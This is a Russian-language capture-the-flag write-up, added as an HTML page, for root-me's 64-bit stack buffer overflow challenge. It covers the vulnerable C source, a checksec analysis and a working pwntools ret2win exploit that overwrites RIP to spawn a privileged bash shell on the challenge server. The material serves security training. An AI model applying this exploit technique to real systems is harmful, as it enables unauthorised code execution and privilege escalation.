@@ -1,0 +1,541 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>root-me ELF-x64-Stack-buffer-overflow-basic — writeup by pr1ncipL£</title>
+<style>
+  @import url('https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Orbitron:wght@400;700;900&display=swap');
+
+  :root {
+    --bg: #090b0f;
+    --bg2: #0d1117;
+    --border: #1a2a1a;
+    --green: #00ff41;
+    --green-dim: #00aa2a;
+    --green-faint: #003310;
+    --cyan: #00d4ff;
+    --red: #ff3e3e;
+    --yellow: #ffd700;
+    --grey: #4a5568;
+    --text: #c8d8c8;
+  }
+
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+
+  body {
+    background: var(--bg);
+    color: var(--text);
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 14px;
+    line-height: 1.7;
+    overflow-x: hidden;
+  }
+
+  /* scanline overlay */
+  body::before {
+    content: '';
+    position: fixed;
+    inset: 0;
+    background: repeating-linear-gradient(
+      0deg,
+      transparent,
+      transparent 2px,
+      rgba(0,255,65,0.015) 2px,
+      rgba(0,255,65,0.015) 4px
+    );
+    pointer-events: none;
+    z-index: 999;
+  }
+
+  /* noise */
+  body::after {
+    content: '';
+    position: fixed;
+    inset: 0;
+    background-image: url("data:image/svg+xml,%3Csvg viewBox='0 0 256 256' xmlns='http://www.w3.org/2000/svg'%3E%3Cfilter id='n'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='0.9' numOctaves='4' stitchTiles='stitch'/%3E%3C/filter%3E%3Crect width='100%25' height='100%25' filter='url(%23n)' opacity='0.03'/%3E%3C/svg%3E");
+    pointer-events: none;
+    z-index: 998;
+    opacity: 0.4;
+  }
+
+  .wrapper {
+    max-width: 860px;
+    margin: 0 auto;
+    padding: 60px 24px 100px;
+  }
+
+  /* HEADER */
+  .header {
+    border-left: 3px solid var(--green);
+    padding-left: 20px;
+    margin-bottom: 60px;
+  }
+
+  .header .platform {
+    color: var(--green-dim);
+    font-size: 11px;
+    letter-spacing: 4px;
+    text-transform: uppercase;
+    margin-bottom: 8px;
+  }
+
+  .header h1 {
+    font-family: 'Orbitron', monospace;
+    font-size: clamp(22px, 4vw, 38px);
+    font-weight: 900;
+    color: var(--green);
+    text-shadow: 0 0 20px rgba(0,255,65,0.4);
+    letter-spacing: 2px;
+    line-height: 1.2;
+    margin-bottom: 12px;
+  }
+
+  .header .meta {
+    display: flex;
+    gap: 24px;
+    flex-wrap: wrap;
+  }
+
+  .badge {
+    display: inline-flex;
+    align-items: center;
+    gap: 6px;
+    padding: 3px 10px;
+    border: 1px solid;
+    font-size: 11px;
+    letter-spacing: 1px;
+    text-transform: uppercase;
+  }
+
+  .badge.diff   { border-color: var(--yellow); color: var(--yellow); }
+  .badge.cat    { border-color: var(--cyan);   color: var(--cyan);   }
+  .badge.author { border-color: var(--green-dim); color: var(--green-dim); }
+
+  /* SECTION */
+  .section {
+    margin-bottom: 48px;
+  }
+
+  .section-title {
+    font-family: 'Orbitron', monospace;
+    font-size: 12px;
+    font-weight: 700;
+    letter-spacing: 4px;
+    text-transform: uppercase;
+    color: var(--green);
+    margin-bottom: 20px;
+    padding-bottom: 8px;
+    border-bottom: 1px solid var(--green-faint);
+    display: flex;
+    align-items: center;
+    gap: 10px;
+  }
+
+  .section-title::before {
+    content: '//';
+    color: var(--green-dim);
+    opacity: 0.6;
+  }
+
+  p {
+    color: var(--text);
+    margin-bottom: 14px;
+    opacity: 0.9;
+  }
+
+  /* CODE BLOCK */
+  .code-block {
+    background: var(--bg2);
+    border: 1px solid var(--border);
+    border-left: 3px solid var(--green-dim);
+    padding: 20px 24px;
+    overflow-x: auto;
+    margin: 20px 0;
+    position: relative;
+  }
+
+  .code-block .lang-tag {
+    position: absolute;
+    top: 8px;
+    right: 12px;
+    font-size: 10px;
+    color: var(--green-dim);
+    opacity: 0.6;
+    letter-spacing: 2px;
+    text-transform: uppercase;
+  }
+
+  .code-block pre {
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 13px;
+    line-height: 1.6;
+    color: var(--green);
+    white-space: pre;
+  }
+
+  /* syntax highlight helpers */
+  .kw   { color: var(--cyan); }
+  .fn   { color: #ffd700; }
+  .str  { color: #98c379; }
+  .num  { color: #e06c75; }
+  .cmt  { color: var(--grey); font-style: italic; }
+  .addr { color: var(--red); }
+
+  /* TERMINAL BLOCK */
+  .terminal {
+    background: #060809;
+    border: 1px solid #1a2a1a;
+    padding: 16px 20px;
+    margin: 20px 0;
+    overflow-x: auto;
+  }
+
+  .terminal .prompt { color: var(--green-dim); }
+  .terminal .cmd    { color: var(--green); }
+  .terminal .out    { color: #6a8a6a; }
+  .terminal .hi     { color: var(--cyan); }
+  .terminal .err    { color: var(--red); }
+  .terminal .win    { color: var(--yellow); }
+
+  /* CHECKSEC TABLE */
+  .checksec {
+    width: 100%;
+    border-collapse: collapse;
+    margin: 20px 0;
+    font-size: 13px;
+  }
+
+  .checksec th {
+    text-align: left;
+    padding: 8px 16px;
+    color: var(--green-dim);
+    font-size: 11px;
+    letter-spacing: 2px;
+    text-transform: uppercase;
+    border-bottom: 1px solid var(--green-faint);
+  }
+
+  .checksec td {
+    padding: 7px 16px;
+    border-bottom: 1px solid rgba(26,42,26,0.4);
+  }
+
+  .checksec td:first-child { color: #8aa08a; }
+
+  .on  { color: var(--red); }
+  .off { color: #3a6a3a; }
+
+  /* STEP */
+  .step {
+    display: flex;
+    gap: 16px;
+    margin-bottom: 32px;
+    align-items: flex-start;
+  }
+
+  .step-num {
+    font-family: 'Orbitron', monospace;
+    font-size: 22px;
+    font-weight: 900;
+    color: var(--green-faint);
+    border: 1px solid var(--green-faint);
+    width: 44px;
+    height: 44px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    flex-shrink: 0;
+    text-shadow: 0 0 8px var(--green);
+    color: var(--green-dim);
+  }
+
+  .step-body { flex: 1; }
+  .step-body h3 {
+    color: var(--green);
+    font-family: 'Orbitron', monospace;
+    font-size: 13px;
+    letter-spacing: 2px;
+    margin-bottom: 10px;
+  }
+
+  /* MEMORY DIAGRAM */
+  .stack-diagram {
+    border: 1px solid var(--border);
+    margin: 20px 0;
+    font-size: 12px;
+    display: inline-block;
+    min-width: 320px;
+  }
+
+  .stack-row {
+    display: flex;
+    border-bottom: 1px solid var(--border);
+  }
+
+  .stack-row:last-child { border-bottom: none; }
+
+  .stack-addr {
+    width: 90px;
+    padding: 6px 10px;
+    color: var(--grey);
+    border-right: 1px solid var(--border);
+    flex-shrink: 0;
+  }
+
+  .stack-val {
+    padding: 6px 14px;
+    flex: 1;
+  }
+
+  .stack-val.buf   { color: #e06c75; background: rgba(224,108,117,0.05); }
+  .stack-val.pad   { color: var(--grey); }
+  .stack-val.ret   { color: var(--cyan); background: rgba(0,212,255,0.06); }
+  .stack-val.win   { color: var(--green); background: rgba(0,255,65,0.06); }
+  .stack-val.rip   { color: var(--yellow); background: rgba(255,215,0,0.06); }
+
+  /* FLAG */
+  .flag-box {
+    border: 1px solid var(--green);
+    padding: 20px 24px;
+    background: rgba(0,255,65,0.03);
+    box-shadow: 0 0 20px rgba(0,255,65,0.05), inset 0 0 20px rgba(0,255,65,0.02);
+    margin: 32px 0;
+    text-align: center;
+  }
+
+  .flag-box .flag-label {
+    font-size: 10px;
+    letter-spacing: 4px;
+    text-transform: uppercase;
+    color: var(--green-dim);
+    margin-bottom: 8px;
+  }
+
+  .flag-box .flag-val {
+    font-family: 'Orbitron', monospace;
+    font-size: 16px;
+    color: var(--green);
+    text-shadow: 0 0 10px rgba(0,255,65,0.5);
+    letter-spacing: 2px;
+  }
+
+  /* FOOTER */
+  .footer {
+    margin-top: 80px;
+    border-top: 1px solid var(--green-faint);
+    padding-top: 24px;
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    flex-wrap: gap;
+    opacity: 0.5;
+    font-size: 11px;
+    letter-spacing: 2px;
+    text-transform: uppercase;
+    color: var(--green-dim);
+  }
+
+  hr.dim {
+    border: none;
+    border-top: 1px solid var(--green-faint);
+    margin: 32px 0;
+  }
+
+  .inline-code {
+    background: var(--green-faint);
+    color: var(--green);
+    padding: 1px 6px;
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 12px;
+  }
+</style>
+</head>
+<body>
+<div class="wrapper">
+
+  <div class="header">
+    <div class="platform">root-me.org · App-Systeme</div>
+    <h1>ELF x64 - Stack buffer overflow - basic<br>classical ret2win</h1>
+    <div class="meta">
+      <span class="badge diff">Easy</span>
+      <span class="badge cat">PWN</span>
+      <span class="badge author">by pr1ncipL£</span>
+    </div>
+  </div>
+
+  <!-- CHALLENGE INFO -->
+  <div class="section">
+    <div class="section-title">Описание задания</div>
+    <p>
+      Задача ELF-x64-Stack-buffer-overflow-basic — классический ret2win. На сервере запущен 64-битный ELF-бинарь
+      с уязвимостью переполнения буфера стека через <span class="inline-code">scanf("%s", buffer)</span>.
+      В бинаре присутствует win-функция <span class="inline-code">callMeMaybe()</span>,
+      запускающая <span class="inline-code">/bin/bash -p</span> через execve.
+      Цель — перехватить RIP и направить выполнение туда.
+    </p>
+  </div>
+
+  <!-- SOURCE CODE -->
+  <div class="section">
+    <div class="section-title">Исходный код (ch35.c)</div>
+    <div class="code-block">
+      <div class="lang-tag">C</div>
+      <pre><span class="kw">#include</span> <span class="str">&lt;stdio.h&gt;</span>
+<span class="kw">#include</span> <span class="str">&lt;string.h&gt;</span>
+<span class="kw">#include</span> <span class="str">&lt;stdlib.h&gt;</span>
+<span class="kw">#include</span> <span class="str">&lt;sys/types.h&gt;</span>
+<span class="kw">#include</span> <span class="str">&lt;unistd.h&gt;</span>
+
+<span class="cmt">/*
+gcc -o ch35 ch35.c -fno-stack-protector -no-pie -Wl,-z,relro,-z,now,-z,noexecstack
+*/</span>
+
+<span class="kw">void</span> <span class="fn">callMeMaybe</span>(){
+    <span class="kw">char</span> *argv[] = { <span class="str">"/bin/bash"</span>, <span class="str">"-p"</span>, NULL };
+    <span class="fn">execve</span>(argv[<span class="num">0</span>], argv, NULL);
+}
+
+<span class="kw">int</span> <span class="fn">main</span>(<span class="kw">int</span> argc, <span class="kw">char</span> **argv){
+
+    <span class="kw">char</span> buffer[<span class="num">256</span>];
+    <span class="kw">int</span> len, i;
+
+    <span class="fn">scanf</span>(<span class="str">"%s"</span>, buffer);
+    len = <span class="fn">strlen</span>(buffer); 
+
+    <span class="fn">printf</span>(<span class="str">"Hello %s\n"</span>, buffer);
+
+    <span class="kw">return</span> <span class="num">0</span>;
+}</pre>
+    </div>
+    <p>
+      Компилируется с флагами <span class="inline-code">-fno-stack-protector -no-pie -Wl,-z,relro,-z,now,-z,noexecstack</span> —
+      канарейки нет, PIE отключён, Full RELRO включён, стек неисполняемый. Идеальные условия для ret2win.
+    </p>
+  </div>
+
+  <!-- CHECKSEC -->
+  <div class="section">
+  <div class="section-title">Анализ бинаря (checksec)</div>
+  <table class="checksec">
+    <tr><th>Защита</th><th>Статус</th><th>Значение</th></tr>
+    <tr><td>Arch</td>    <td class="hi">amd64-64-little</td><td>64-bit, little endian</td></tr>
+    <tr><td>RELRO</td>   <td class="on">Full RELRO</td>      <td>GOT защищён, но не нужен</td></tr>
+    <tr><td>Stack</td>   <td class="off">No canary</td>      <td>overflow свободен</td></tr>
+    <tr><td>NX</td>      <td class="on">Enabled</td>         <td>shellcode на стеке не работает</td></tr>
+    <tr><td>PIE</td>     <td class="off">No PIE (0x400000)</td><td>адреса .text фиксированы</td></tr>
+    <tr><td>Stripped</td><td class="off">No</td>             <td>символы присутствуют</td></tr>
+  </table>
+  <p>
+    NX включён — шеллкод нельзя. Но PIE выключен, значит адрес <span class="inline-code">callMeMaybe</span>
+    всегда одинаков, как на сервере, так и локально (при условии одинакового бинаря).
+  </p>
+  </div>
+
+  <!-- EXPLOITATION STEPS -->
+  <div class="section">
+    <div class="section-title">Процесс эксплуатации</div>
+
+    <div class="step">
+      <div class="step-num">1</div>
+      <div class="step-body">
+        <h3>Определение offset до RIP</h3>
+        <p>
+          Буфер <span class="inline-code">char buffer[256]</span>, но между ним и сохранённым RIP
+          на стеке ещё лежит выравнивание и сохранённый RBP (8 байт).
+          Итоговый offset экспериментально: <strong>280 байт</strong>.
+        </p>
+        <div class="stack-diagram">
+          <div class="stack-row"><div class="stack-addr">rbp-0x108</div><div class="stack-val buf">buffer[256] ← начало ввода</div></div>
+          <div class="stack-row"><div class="stack-addr">...</div><div class="stack-val pad">alignment / padding (24 байта)</div></div>
+          <div class="stack-row"><div class="stack-addr">rbp+0x00</div><div class="stack-val ret">saved RBP (8 байт)</div></div>
+          <div class="stack-row"><div class="stack-addr">rbp+0x08</div><div class="stack-val rip">saved RIP ← перезаписываем</div></div>
+        </div>
+      </div>
+    </div>
+
+    <div class="step">
+      <div class="step-num">2</div>
+      <div class="step-body">
+        <h3>Получение правильного адреса</h3>
+        <p>
+          Локальный бинарь отличается от серверного — адрес <span class="inline-code">callMeMaybe</span> разный.
+          Решение: скачать бинарь с сервера через SSH и спарсить адрес прямо в скрипте.
+        </p>
+        <div class="terminal">
+          <span class="out">[+] Downloading '/challenge/app-systeme/ch35/ch35' to './ch35': Done</span><br>
+          <span class="hi">0x4005e7</span>  <span class="out">← адрес callMeMaybe на сервере</span>
+        </div>
+      </div>
+    </div>
+
+    <div class="step">
+      <div class="step-num">3</div>
+      <div class="step-body">
+        <h3>Финальный эксплойт</h3>
+        <div class="code-block">
+          <div class="lang-tag">Python</div>
+          <pre><span class="kw">from</span> pwn <span class="kw">import</span> *
+
+s = <span class="fn">ssh</span>(user=<span class="str">'app-systeme-ch35'</span>,
+        host=<span class="str">'challenge03.root-me.org'</span>,
+        port=<span class="num">2223</span>,
+        password=<span class="str">'app-systeme-ch35'</span>)
+
+<span class="cmt"># скачиваем серверный бинарь — адреса совпадут точно</span>
+s.<span class="fn">download_file</span>(<span class="str">'/challenge/app-systeme/ch35/ch35'</span>, <span class="str">'./ch35'</span>)
+
+elf = <span class="fn">ELF</span>(<span class="str">'./ch35'</span>)
+callMeMaybe = elf.symbols[<span class="str">'callMeMaybe'</span>]  <span class="cmt"># win function</span>
+
+<span class="fn">print</span>(<span class="fn">hex</span>(callMeMaybe))  <span class="cmt"># 0x4005e7</span>
+
+p = s.<span class="fn">run</span>(<span class="str">'/challenge/app-systeme/ch35/ch35'</span>)
+
+payload  = b<span class="str">'A'</span> * <span class="num">280</span>       <span class="cmt"># заполняем до RIP</span>
+payload += <span class="fn">p64</span>(callMeMaybe)  <span class="cmt"># прыгаем в win</span>
+
+p.<span class="fn">sendline</span>(payload)
+p.<span class="fn">interactive</span>()
+</pre>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- RESULT -->
+  <div class="section">
+    <div class="section-title">Результат</div>
+    <div class="terminal">
+      <span class="out">[+] Opening new channel: '/challenge/app-systeme/ch35/ch35': Done</span><br>
+      <span class="out">[*] Switching to interactive mode</span><br>
+      <span class="out">Hello AAAA...AAAA\x1b\x01</span><br>
+      <span class="win">bash-4.4$ cat .passwd</span><br>
+      <span class="win">#########</span>
+    </div>
+    <p>Shell получен с флагом в <span class="inline-code">.passwd</span>. Задача решена.</p>
+  </div>
+
+  <!-- KEY TAKEAWAYS -->
+  <div class="section">
+    <div class="section-title">Выводы</div>
+    <p><strong style="color:var(--cyan)">1. Всегда тестируй на том же бинаре.</strong>
+       Локальная компиляция даёт другие адреса. Правильный способ — скачать бинарь с сервера
+       через <span class="inline-code">ssh.download_file()</span> и работать с ним.</p>
+    <p><strong style="color:var(--cyan)">2. Stack alignment — ситуативно.</strong>
+       System V AMD64 ABI требует RSP % 16 == 0 при <span class="inline-code">call</span>.
+       В ret2win это <em>иногда</em> нужен лишний <span class="inline-code">ret</span>-гаджет — зависит от того,
+       что делает win-функция. <span class="inline-code">execve</span> в данном случае сработал и без него.</p>
+    <p><strong style="color:var(--cyan)">3. PIE off ≠ ASLR off.</strong>
+       ASLR рандомизирует стек и libc, но адреса .text при отключённом PIE фиксированы всегда.</p>
+  </div>
+
+  <div class="footer">
+    <span>pr1ncipL£ · 2026</span>
+    <span>root-me · app-systeme · ELF-x64-Stack-buffer-overflow-basic</span>
+  </div>
+
+</div>
+</body>
+</html>
